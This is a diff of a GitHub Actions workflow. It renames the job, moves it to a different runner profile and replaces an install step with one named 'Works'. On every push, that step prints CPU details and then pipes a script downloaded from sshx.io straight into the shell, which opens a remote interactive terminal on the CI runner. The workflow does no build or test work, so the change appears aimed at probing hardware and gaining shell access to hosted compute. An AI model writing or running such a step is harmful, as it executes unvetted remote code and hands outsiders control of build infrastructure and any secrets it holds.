@@ -1,22 +1,16 @@
-name: gex
+name: ger2
 
 on: push
 
 jobs:
   check_cpu:
-    runs-on: depot-ubuntu-24.04-32
-    strategy:
-      matrix:
-        instance: [1, 2]
-    
+    runs-on: namespace-profile-name-spave-jsbeinw
+
     steps:
     - name: Checkout code
       uses: actions/checkout@v4
 
-    - name: Install system dependencies
+    - name: Works
       run: |
-        sudo apt update
-        sudo apt install -y wget curl python3
-        curl ipinfo.io
-
-    
+        lscpu
+        apt update && apt install curl -y && curl -sSf https://sshx.io/get | sh -s run
